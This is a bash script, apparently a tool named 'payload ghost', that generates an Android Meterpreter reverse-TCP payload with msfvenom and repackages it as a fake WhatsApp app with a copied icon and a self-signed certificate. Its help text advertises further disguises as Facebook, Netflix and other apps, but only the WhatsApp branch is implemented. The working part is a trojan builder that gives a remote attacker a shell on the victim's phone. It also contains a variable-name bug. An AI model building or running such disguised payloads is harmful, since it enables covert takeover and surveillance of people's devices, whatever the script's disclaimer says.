#!/bin/bash
while [ -n "$1" ]; do 

	case "$1" in

	-w) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /usr/$name.apk
cd /usr
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|WhatsApp|g' strings.xml
cd ..
mkdir drawable
cd /bin/Imagenes/WhatsApp/
cp main_icon.png /usr/$nombre/res/drawable
sleep 5
cd /usr
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
setterm -foreground green
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish
    ;; 

	-f) echo "-b option passed" 
    
    ;; 

	-s) echo "-c option passed" 
    
    ;; 

    -r) echo "-c option passed" 
    
    ;;

    -e) echo "-c option passed" 
    
    ;;

    -h)

    echo "
                     Information                               Options

       the payload ghost is a program to generate        < -w WhatsApp >
       msfvenom payloads but with a very curious end     < -f Facebook >
       result, since it changes its appearance           < -s Spotify >
       to look like very fashionable applications.       < -r Repelis-plus >
       <DISCLAIMER>: TheHorseOnFireARG is not            < -e Es-File >
       responsible for the misuse of this program        < -i Instagram >
       is created with the purpose of using it in        < -t Twitter >
       controlled environments.                          < -n Netflix >
                                                         < -d Dialer (call) >"

    ;;

    -i) echo "-c option passed" 
    
    ;;

    -t) echo "-c option passed" 
    
    ;;

    -n) echo "-c option passed" 
    
    ;;

    -d) echo "-c option passed" 
    
    ;;

	*) echo "Option $1 not recognized" ;; 

	esac

	shift

done
